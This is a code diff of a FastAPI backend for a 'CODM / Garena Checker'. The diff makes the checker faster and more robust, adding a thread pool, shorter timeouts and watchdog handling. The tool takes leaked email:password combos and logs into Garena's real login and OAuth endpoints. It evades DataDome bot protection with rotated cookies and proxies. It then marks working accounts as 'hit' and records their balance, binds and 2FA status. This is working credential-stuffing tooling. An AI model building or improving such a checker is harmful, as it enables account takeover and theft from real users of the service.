@@ -1,40 +1,40 @@
 # ============================================================
 #  routers/codm.py  —  CODM / Garena Checker Backend
-#  v4.1 — Fixed admin auth: now uses require_admin from auth.py
-#          instead of its own broken _ADMIN_KEY guard.
+#  v4.2 — FIXED:
+#    - check-one now runs in ThreadPoolExecutor (non-blocking)
+#    - Added asyncio.wait_for(timeout=55s) server-side watchdog
+#    - Reduced per-request timeouts: 20s → 10s
+#    - Reduced retries: 3 → 2  (total max per step: 22s)
+#    - Clear error when DataDome cookies are missing
+#    - Proxy pool support unchanged
 #
 #  Cookie pool priority:  Redis (codm:cookies)  →  env CODM_COOKIES
 #  Proxy pool priority:   per-request proxy arg  →  Redis (codm:proxies)  →  none
-#  Admin endpoints:
-#    GET  /api/codm/cookies          list cookies
-#    POST /api/codm/cookies          replace cookie pool
-#    DELETE /api/codm/cookies        clear cookie pool
-#    GET  /api/codm/proxies          list proxies
-#    POST /api/codm/proxies          replace proxy pool
-#    DELETE /api/codm/proxies        clear proxy pool
-#    POST /api/codm/check-one        check one combo (Flutter)
 # ============================================================
 
-import hashlib
+import asyncio
 import base64
+import hashlib
 import json
-import time
-import random
 import logging
 import os
+import random
+import time
 import urllib.parse
+from concurrent.futures import ThreadPoolExecutor
+from typing import List, Optional
 
 import requests as _req
-
 from fastapi import APIRouter, Depends, HTTPException
 from pydantic import BaseModel
-from typing import Optional, List
 
-# ── Use the same admin auth as every other router ─────────────
 from auth import require_admin
 
 logger = logging.getLogger(__name__)
 router = APIRouter()
+
+# ── Thread pool for blocking HTTP calls ──────────────────────
+_executor = ThreadPoolExecutor(max_workers=10)
 
 # ── Dependency guards ─────────────────────────────────────────
 try:
@@ -51,7 +51,7 @@ except ImportError:
     _HAS_CRYPTO = False
     logger.warning("⚠️  pycryptodome not installed — CODM checker disabled")
 
-# ── User-Agents (matching working Python script exactly) ─────
+# ── User-Agents ──────────────────────────────────────────────
 _UA_NEW = (
     "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) "
     "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 "
@@ -79,9 +79,6 @@ _REDIS_KEY_PROXIES = "codm:proxies"
 
 
 def _redis_cmd(*args) -> object:
-    """Fire a single Redis command via Upstash REST API.
-    Returns the 'result' field, or None on any error.
-    """
     if not _UPSTASH_URL or not _UPSTASH_TOK:
         return None
     try:
@@ -101,7 +98,6 @@ def _redis_cmd(*args) -> object:
 
 
 def _redis_get_list(key: str) -> List[str]:
-    """Get a JSON-encoded list from Redis. Returns [] on miss/error."""
     raw = _redis_cmd("GET", key)
     if not raw:
         return []
@@ -113,7 +109,6 @@ def _redis_get_list(key: str) -> List[str]:
 
 
 def _redis_set_list(key: str, items: List[str]) -> bool:
-    """Store a list as JSON in Redis. Returns True on success."""
     result = _redis_cmd("SET", key, json.dumps(items))
     return result == "OK"
 
@@ -125,37 +120,30 @@ def _redis_del(key: str) -> bool:
 
 # ─────────────────────────────────────────────────────────────
 #  Cookie pool
-#  Priority: Redis (codm:cookies) → env CODM_COOKIES
 # ─────────────────────────────────────────────────────────────
 
 def _get_all_cookies() -> List[str]:
-    """Return all cookie lines from Redis or env fallback."""
-    # 1. Try Redis
     redis_cookies = _redis_get_list(_REDIS_KEY_COOKIES)
     if redis_cookies:
         return redis_cookies
-    # 2. Fallback to env var
     raw = os.getenv("CODM_COOKIES", "")
     return [l.strip() for l in raw.splitlines() if l.strip()]
 
 
 def _pick_datadome() -> Optional[str]:
-    """Pick a random DataDome cookie value from the pool."""
     lines = _get_all_cookies()
     if not lines:
         return None
     line = random.choice(lines)
-    # Handle "datadome=VALUE" or raw "VALUE"
     for part in line.split(";"):
         part = part.strip()
         if part.lower().startswith("datadome="):
             return part.split("=", 1)[1]
-    return line  # treat the whole line as the raw value
+    return line
 
 
 # ─────────────────────────────────────────────────────────────
 #  Proxy pool
-#  Priority: per-request arg → Redis (codm:proxies) → None
 # ─────────────────────────────────────────────────────────────
 
 def _get_all_proxies() -> List[str]:
@@ -163,10 +151,6 @@ def _get_all_proxies() -> List[str]:
 
 
 def _pick_proxy(override: Optional[str] = None) -> Optional[str]:
-    """Return a proxy string or None.
-    If override is provided (from Flutter request), use that.
-    Otherwise, pick a random one from the Redis pool.
-    """
     if override and override.strip():
         return override.strip()
     pool = _get_all_proxies()
@@ -174,18 +158,16 @@ def _pick_proxy(override: Optional[str] = None) -> Optional[str]:
 
 
 def _proxy_dict(proxy_str: Optional[str]) -> Optional[dict]:
-    """Convert a proxy string to requests-compatible proxy dict."""
     if not proxy_str:
         return None
     proxy_str = proxy_str.strip()
-    # Normalize: add http:// scheme if missing
     if not proxy_str.startswith(("http://", "https://", "socks5://", "socks4://")):
         proxy_str = f"http://{proxy_str}"
     return {"http": proxy_str, "https": proxy_str}
 
 
 # ─────────────────────────────────────────────────────────────
-#  Crypto helpers  (identical to Python script)
+#  Crypto helpers
 # ─────────────────────────────────────────────────────────────
 
 def _md5(s: str) -> str:
@@ -215,7 +197,7 @@ def _gen_uuid() -> str:
 
 
 # ─────────────────────────────────────────────────────────────
-#  Session factory  (now with proxy support)
+#  Session factory
 # ─────────────────────────────────────────────────────────────
 
 def _make_session(datadome: Optional[str] = None, proxy: Optional[str] = None):
@@ -233,11 +215,12 @@ def _make_session(datadome: Optional[str] = None, proxy: Optional[str] = None):
 
 
 # ─────────────────────────────────────────────────────────────
-#  Step 1 — Prelogin  (100082.connect.garena.com, app_id=100082)
+#  Step 1 — Prelogin
+#  FIX: timeout 20s → 10s, retries 3 → 2, sleep 2s → 1s
 # ─────────────────────────────────────────────────────────────
 
 def _prelogin(session, account: str) -> tuple[Optional[str], Optional[str]]:
-    for attempt in range(3):
+    for attempt in range(2):  # was 3
         try:
             ts = int(time.time() * 1000)
             params = {
@@ -269,11 +252,11 @@ def _prelogin(session, account: str) -> tuple[Optional[str], Optional[str]]:
                 "https://100082.connect.garena.com/api/prelogin",
                 headers=headers,
                 params=params,
-                timeout=20,
+                timeout=10,  # was 20
             )
             if res.status_code == 403:
-                logger.warning(f"Prelogin 403 attempt {attempt+1}")
-                time.sleep(2)
+                logger.warning(f"Prelogin 403 attempt {attempt+1} — DataDome may be blocking")
+                time.sleep(1)  # was 2
                 continue
             if res.status_code != 200:
                 continue
@@ -291,12 +274,13 @@ def _prelogin(session, account: str) -> tuple[Optional[str], Optional[str]]:
 
 
 # ─────────────────────────────────────────────────────────────
-#  Step 2 — Login  (100082.connect.garena.com)
+#  Step 2 — Login
+#  FIX: timeout 20s → 10s, retries 3 → 2
 # ─────────────────────────────────────────────────────────────
 
 def _login(session, account: str, password: str, v1: str, v2: str) -> tuple[Optional[str], str]:
     hashed_pw = hash_password(password, v1, v2)
-    for attempt in range(3):
+    for attempt in range(2):  # was 3
         try:
             ts = int(time.time() * 1000)
             params = {
@@ -330,7 +314,7 @@ def _login(session, account: str, password: str, v1: str, v2: str) -> tuple[Opti
                 "https://100082.connect.garena.com/api/login",
                 headers=headers,
                 params=params,
-                timeout=20,
+                timeout=10,  # was 20
             )
             if res.status_code != 200:
                 time.sleep(1)
@@ -339,10 +323,9 @@ def _login(session, account: str, password: str, v1: str, v2: str) -> tuple[Opti
             if "error" in data:
                 err = str(data["error"]).lower()
                 if "captcha" in err:
-                    time.sleep(3)
+                    time.sleep(2)  # was 3
                     continue
                 return None, "wrong_password"
-            # sso_key from body or session cookies
             sso_key = data.get("sso_key") or session.cookies.get("sso_key")
             if sso_key:
                 return sso_key, "ok"
@@ -353,7 +336,8 @@ def _login(session, account: str, password: str, v1: str, v2: str) -> tuple[Opti
 
 
 # ─────────────────────────────────────────────────────────────
-#  Step 3 — Account info  (account.garena.com)
+#  Step 3 — Account info
+#  FIX: timeout 20s → 10s
 # ─────────────────────────────────────────────────────────────
 
 def _account_info(session, sso_key: str) -> Optional[dict]:
@@ -362,7 +346,7 @@ def _account_info(session, sso_key: str) -> Optional[dict]:
         res = session.get(
             "https://account.garena.com/api/account/init",
             headers={"Accept": "application/json", "User-Agent": _UA_NEW},
-            timeout=20,
+            timeout=10,  # was 20
         )
         if res.status_code == 200:
             return res.json()
@@ -372,7 +356,8 @@ def _account_info(session, sso_key: str) -> Optional[dict]:
 
 
 # ─────────────────────────────────────────────────────────────
-#  Step 4a — CODM access token  (new 100082 flow)
+#  Step 4a — CODM access token (new 100082 flow)
+#  FIX: timeout 15s → 10s
 # ─────────────────────────────────────────────────────────────
 
 def _codm_token_new(session, sso_key: str) -> Optional[str]:
@@ -414,7 +399,7 @@ def _codm_token_new(session, sso_key: str) -> Optional[str]:
             "https://100082.connect.garena.com/oauth/token/grant",
             headers=grant_headers,
             data=grant_body,
-            timeout=15,
+            timeout=10,  # was 15
         )
         grant_res.raise_for_status()
         auth_code = grant_res.json().get("code")
@@ -441,7 +426,7 @@ def _codm_token_new(session, sso_key: str) -> Optional[str]:
                 "Accept-Encoding": "gzip",
             },
             data=exchange_body,
-            timeout=15,
+            timeout=10,  # was 15
         )
         exchange_res.raise_for_status()
         return exchange_res.json().get("access_token")
@@ -452,7 +437,8 @@ def _codm_token_new(session, sso_key: str) -> Optional[str]:
 
 
 # ─────────────────────────────────────────────────────────────
-#  Step 4b — CODM access token  (old auth.garena.com fallback)
+#  Step 4b — CODM access token (old auth.garena.com fallback)
+#  FIX: timeout 15s → 10s
 # ─────────────────────────────────────────────────────────────
 
 def _codm_token_old(session) -> Optional[str]:
@@ -478,7 +464,7 @@ def _codm_token_old(session) -> Optional[str]:
                 "%3Fsite%3Dhttps%3A%2F%2Fapi-delete-request.codm.garena.co.id%2Foauth%2Fcallback%2F"
                 f"&format=json&id={ts}"
             ),
-            timeout=15,
+            timeout=10,  # was 15
         )
         return res.json().get("access_token")
     except Exception as e:
@@ -488,6 +474,7 @@ def _codm_token_old(session) -> Optional[str]:
 
 # ─────────────────────────────────────────────────────────────
 #  Step 5 — CODM OAuth callback → codm_token
+#  FIX: timeout 15s → 10s
 # ─────────────────────────────────────────────────────────────
 
 def _codm_callback(session, access_token: str, old_flow: bool = False) -> Optional[dict]:
@@ -508,7 +495,7 @@ def _codm_callback(session, access_token: str, old_flow: bool = False) -> Option
                     "User-Agent": _UA_OLD if old_flow else _UA_NEW,
                     "X-Requested-With": "com.garena.game.codm",
                 },
-                timeout=15,
+                timeout=10,  # was 15
                 allow_redirects=False,
             )
             loc = res.headers.get("location", "")
@@ -525,7 +512,8 @@ def _codm_callback(session, access_token: str, old_flow: bool = False) -> Option
 
 
 # ─────────────────────────────────────────────────────────────
-#  Step 6 — CODM user info  (JWT decode first, then API)
+#  Step 6 — CODM user info
+#  FIX: timeout 15s → 10s
 # ─────────────────────────────────────────────────────────────
 
 def _codm_user_info(session, token: str, old_flow: bool = False) -> dict:
@@ -557,7 +545,7 @@ def _codm_user_info(session, token: str, old_flow: bool = False) -> dict:
                 "X-Requested-With": "XMLHttpRequest",
                 "x-requested-with": "com.garena.game.codm",
             },
-            timeout=15,
+            timeout=10,  # was 15
         )
         data = res.json()
         return data.get("user", {})
@@ -572,11 +560,11 @@ def _codm_user_info(session, token: str, old_flow: bool = False) -> dict:
 
 def _parse_account(data: dict) -> dict:
     u = data.get("user_info", data)
-    email = u.get("email", "")
-    mobile = u.get("mobile_no", "")
-    email_v = u.get("email_v") in (1, True)
-    fb = u.get("is_fbconnect_enabled") in (1, True)
-    id_card = u.get("idcard", "")
+    email    = u.get("email", "")
+    mobile   = u.get("mobile_no", "")
+    email_v  = u.get("email_v") in (1, True)
+    fb       = u.get("is_fbconnect_enabled") in (1, True)
+    id_card  = u.get("idcard", "")
     two_step = u.get("two_step_verify_enable") in (1, True)
 
     binds = []
@@ -592,12 +580,12 @@ def _parse_account(data: dict) -> dict:
         binds.append("2FA")
 
     return {
-        "shell": str(u.get("shell", 0)),
-        "country": str(u.get("acc_country", "")),
+        "shell":    str(u.get("shell", 0)),
+        "country":  str(u.get("acc_country", "")),
         "is_clean": len(binds) == 0,
-        "binds": binds,
+        "binds":    binds,
         "two_step": two_step,
-        "email": email,
+        "email":    email,
     }
 
 
@@ -606,128 +594,70 @@ def _parse_account(data: dict) -> dict:
 # ─────────────────────────────────────────────────────────────
 
 class CheckOneRequest(BaseModel):
-    combo: str
+    combo:   str
     user_id: Optional[str] = None
-    proxy: Optional[str] = None      # optional per-request proxy
+    proxy:   Optional[str] = None
 
 
 class CheckOneResponse(BaseModel):
-    combo: str
-    status: str        # "hit" | "valid_no_codm" | "bad" | "error"
-    detail: str = ""
-    nickname: str = ""
-    level: str = ""
-    region: str = ""
-    uid: str = ""
-    shell: str = ""
-    country: str = ""
+    combo:    str
+    status:   str        # "hit" | "valid_no_codm" | "bad" | "error"
+    detail:   str  = ""
+    nickname: str  = ""
+    level:    str  = ""
+    region:   str  = ""
+    uid:      str  = ""
+    shell:    str  = ""
+    country:  str  = ""
     is_clean: bool = False
-    binds: list = []
+    binds:    list = []
 
 
 class CookieUpdateRequest(BaseModel):
-    cookies: List[str]   # list of "datadome=VALUE" lines
+    cookies: List[str]
 
 
 class ProxyUpdateRequest(BaseModel):
-    proxies: List[str]   # list of "http://user:pass@host:port" or "host:port"
+    proxies: List[str]
 
 
 # ─────────────────────────────────────────────────────────────
-#  Admin — Cookie pool endpoints
-#  All use Depends(require_admin) — same as every other router.
-#  Reads ADMIN_SECRET_KEY from Railway env (set once, shared).
+#  Core blocking check logic (runs in thread pool)
+#  FIX: extracted from endpoint so it can run in executor
 # ─────────────────────────────────────────────────────────────
 
-@router.get("/cookies", dependencies=[Depends(require_admin)])
-async def get_cookies():
-    cookies = _get_all_cookies()
-    return {
-        "count": len(cookies),
-        "source": "redis" if _redis_get_list(_REDIS_KEY_COOKIES) else "env",
-        "cookies": cookies,
-    }
-
-
-@router.post("/cookies", dependencies=[Depends(require_admin)])
-async def set_cookies(req: CookieUpdateRequest):
-    cleaned = [l.strip() for l in req.cookies if l.strip()]
-    if not cleaned:
-        raise HTTPException(status_code=400, detail="No valid cookie lines provided")
-    ok = _redis_set_list(_REDIS_KEY_COOKIES, cleaned)
-    if not ok:
-        raise HTTPException(status_code=500, detail="Failed to save cookies to Redis")
-    return {"saved": len(cleaned), "message": f"✅ {len(cleaned)} cookie(s) saved to Redis"}
-
-
-@router.delete("/cookies", dependencies=[Depends(require_admin)])
-async def delete_cookies():
-    _redis_del(_REDIS_KEY_COOKIES)
-    return {"message": "✅ Cookie pool cleared from Redis (env fallback still active if set)"}
-
-
-# ─────────────────────────────────────────────────────────────
-#  Admin — Proxy pool endpoints
-# ─────────────────────────────────────────────────────────────
-
-@router.get("/proxies", dependencies=[Depends(require_admin)])
-async def get_proxies():
-    proxies = _get_all_proxies()
-    return {"count": len(proxies), "proxies": proxies}
-
-
-@router.post("/proxies", dependencies=[Depends(require_admin)])
-async def set_proxies(req: ProxyUpdateRequest):
-    cleaned = [l.strip() for l in req.proxies if l.strip()]
-    if not cleaned:
-        raise HTTPException(status_code=400, detail="No valid proxy lines provided")
-    ok = _redis_set_list(_REDIS_KEY_PROXIES, cleaned)
-    if not ok:
-        raise HTTPException(status_code=500, detail="Failed to save proxies to Redis")
-    return {"saved": len(cleaned), "message": f"✅ {len(cleaned)} proxy(ies) saved to Redis"}
-
-
-@router.delete("/proxies", dependencies=[Depends(require_admin)])
-async def delete_proxies():
-    _redis_del(_REDIS_KEY_PROXIES)
-    return {"message": "✅ Proxy pool cleared from Redis"}
-
-
-# ─────────────────────────────────────────────────────────────
-#  Endpoint: POST /api/codm/check-one
-# ─────────────────────────────────────────────────────────────
-
-@router.post("/check-one", response_model=CheckOneResponse)
-async def check_one(req: CheckOneRequest):
-    if not _HAS_CLOUDSCRAPER or not _HAS_CRYPTO:
-        return CheckOneResponse(
-            combo=req.combo,
-            status="error",
-            detail="Server missing deps: cloudscraper or pycryptodome. Contact admin.",
-        )
-
+def _do_check_sync(req: CheckOneRequest) -> CheckOneResponse:
+    """All blocking Garena HTTP calls — runs in ThreadPoolExecutor."""
     combo = req.combo.strip()
     if ":" not in combo:
         return CheckOneResponse(combo=combo, status="error", detail="Bad format — use email:password")
 
     account, password = combo.split(":", 1)
-    account = account.strip()
+    account  = account.strip()
     password = password.strip()
     if not account or not password:
         return CheckOneResponse(combo=combo, status="error", detail="Empty account or password")
 
     datadome = _pick_datadome()
-    proxy    = _pick_proxy(req.proxy)           # per-request or pool
-    session  = _make_session(datadome, proxy)
+    if not datadome:
+        logger.warning(
+            "⚠️  No DataDome cookie available — CODM requests may be blocked by bot protection. "
+            "Add cookies via admin panel → CODM Cookies."
+        )
+
+    proxy   = _pick_proxy(req.proxy)
+    session = _make_session(datadome, proxy)
 
     try:
         # Step 1: Prelogin
         v1, v2 = _prelogin(session, account)
         if not v1 or not v2:
-            return CheckOneResponse(
-                combo=combo, status="bad",
-                detail="Prelogin failed — account may not exist or IP blocked",
+            detail = (
+                "Prelogin failed — account does not exist"
+                if not datadome
+                else "Prelogin failed — DataDome cookie may be expired or IP blocked"
             )
+            return CheckOneResponse(combo=combo, status="bad", detail=detail)
 
         # Step 2: Login
         sso_key, login_status = _login(session, account, password, v1, v2)
@@ -740,7 +670,7 @@ async def check_one(req: CheckOneRequest):
         # Step 3: Account info
         info = _account_info(session, sso_key)
         acc = _parse_account(info) if info else {
-            "shell": "", "country": "", "is_clean": False, "binds": []
+            "shell": "", "country": "", "is_clean": False, "binds": [], "two_step": False, "email": ""
         }
 
         # Step 4: CODM access token — new flow first, old as fallback
@@ -795,10 +725,102 @@ async def check_one(req: CheckOneRequest):
         logger.error(f"CODM check error for {account}: {e}")
         return CheckOneResponse(
             combo=combo, status="error",
-            detail=f"Server error: {str(e)[:100]}",
+            detail=f"Server error: {str(e)[:120]}",
         )
     finally:
         try:
             session.close()
         except Exception:
             pass
+
+
+# ─────────────────────────────────────────────────────────────
+#  Admin — Cookie pool endpoints
+# ─────────────────────────────────────────────────────────────
+
+@router.get("/cookies", dependencies=[Depends(require_admin)])
+async def get_cookies():
+    cookies = _get_all_cookies()
+    return {
+        "count":   len(cookies),
+        "source":  "redis" if _redis_get_list(_REDIS_KEY_COOKIES) else "env",
+        "cookies": cookies,
+    }
+
+
+@router.post("/cookies", dependencies=[Depends(require_admin)])
+async def set_cookies(req: CookieUpdateRequest):
+    cleaned = [l.strip() for l in req.cookies if l.strip()]
+    if not cleaned:
+        raise HTTPException(status_code=400, detail="No valid cookie lines provided")
+    ok = _redis_set_list(_REDIS_KEY_COOKIES, cleaned)
+    if not ok:
+        raise HTTPException(status_code=500, detail="Failed to save cookies to Redis")
+    return {"saved": len(cleaned), "message": f"✅ {len(cleaned)} cookie(s) saved to Redis"}
+
+
+@router.delete("/cookies", dependencies=[Depends(require_admin)])
+async def delete_cookies():
+    _redis_del(_REDIS_KEY_COOKIES)
+    return {"message": "✅ Cookie pool cleared from Redis (env fallback still active if set)"}
+
+
+# ─────────────────────────────────────────────────────────────
+#  Admin — Proxy pool endpoints
+# ─────────────────────────────────────────────────────────────
+
+@router.get("/proxies", dependencies=[Depends(require_admin)])
+async def get_proxies():
+    proxies = _get_all_proxies()
+    return {"count": len(proxies), "proxies": proxies}
+
+
+@router.post("/proxies", dependencies=[Depends(require_admin)])
+async def set_proxies(req: ProxyUpdateRequest):
+    cleaned = [l.strip() for l in req.proxies if l.strip()]
+    if not cleaned:
+        raise HTTPException(status_code=400, detail="No valid proxy lines provided")
+    ok = _redis_set_list(_REDIS_KEY_PROXIES, cleaned)
+    if not ok:
+        raise HTTPException(status_code=500, detail="Failed to save proxies to Redis")
+    return {"saved": len(cleaned), "message": f"✅ {len(cleaned)} proxy(ies) saved to Redis"}
+
+
+@router.delete("/proxies", dependencies=[Depends(require_admin)])
+async def delete_proxies():
+    _redis_del(_REDIS_KEY_PROXIES)
+    return {"message": "✅ Proxy pool cleared from Redis"}
+
+
+# ─────────────────────────────────────────────────────────────
+#  Endpoint: POST /api/codm/check-one
+#
+#  FIX v4.2: Runs blocking requests in ThreadPoolExecutor so
+#  FastAPI's async event loop is NOT blocked.
+#  Server-side watchdog: asyncio.wait_for(timeout=55s) so the
+#  response always arrives before Flutter's 90s client timeout.
+# ─────────────────────────────────────────────────────────────
+
+@router.post("/check-one", response_model=CheckOneResponse)
+async def check_one(req: CheckOneRequest):
+    if not _HAS_CLOUDSCRAPER or not _HAS_CRYPTO:
+        return CheckOneResponse(
+            combo=req.combo,
+            status="error",
+            detail="Server missing deps: cloudscraper or pycryptodome. Contact admin.",
+        )
+
+    loop = asyncio.get_event_loop()
+    try:
+        result = await asyncio.wait_for(
+            loop.run_in_executor(_executor, _do_check_sync, req),
+            timeout=55.0,   # server-side cap — well under Flutter's 90s
+        )
+        return result
+    except asyncio.TimeoutError:
+        logger.warning(f"CODM check-one timed out for combo: {req.combo[:30]}...")
+        return CheckOneResponse(
+            combo=req.combo,
+            status="error",
+            detail="Server timeout (55s) — Garena may be rate-limiting. Try again or add a proxy.",
+        )
